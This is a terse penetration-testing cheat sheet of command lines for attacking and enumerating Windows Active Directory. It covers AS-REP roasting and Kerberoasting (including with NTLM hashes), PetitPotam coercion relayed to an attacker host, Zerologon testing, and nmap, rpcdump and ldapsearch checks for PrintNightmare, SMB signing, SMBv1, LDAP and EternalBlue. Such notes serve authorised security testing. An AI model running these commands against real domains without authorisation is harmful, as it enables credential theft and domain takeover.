# Windows Active Directory

## AS-REP Roasting

GetNPUsers.py -dc-ip <TARGET_IP> -usersfile /usr/share/seclists/Usernames/top-usernames-shortlist.txt
 -no-pass <DOMAIN.TLD>/ | grep -v UNKNOWN
 
GetNPUsers.py -dc-ip <TARGET_IP> -usersfile /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -no-pass <DOMAIN.TLD>/ | grep -v UNKNOWN

## PetitPotam
ntlmrelayx.py -smb2support

python3 petitpotam.py <ATTACKER_IP> <TARGET_IP>

## ZeroLogin
python3 zerologon_tester.py <NETBIOS DC COMPUTER NAME> <TARGET_IP>

## Kerberoasting
GetUserSPNs.py -request <AD_DOMAIN>/<USER>:<PASSWORD>

GetUserSPNs.py -request<AD_DOMAIN>/<USER> -hashes <REPLACE WITH NTLM HASHES eg ABC:DEF>

## PrintNightmare
rpcdump.py <TARGET_IP> | egrep 'MS-RPRN|MS-PAR'

## SMB Signing
nmap --script smb2-security-mode -p 445 <TARGET_IP>

## SMBv1
nmap --script smb-protocols -p 445 <TARGET_IP>

## LDAP
nmap -sV -p 389,636,3268,3269 --script ldap-search,ldap-rootdse,ldap-novell-getpass <TARGET_IP>

ldapsearch -x -H ldap://<TARGET_IP>:3268

ldapsearch -x -H ldap://<TARGET_IP>:3268 -b "dc=<CHANGE>,dc=<CHANGE>"

## EternalBlue
nmap --script smb-vuln-ms17-010 -p 445 <IP_ADDRESS>
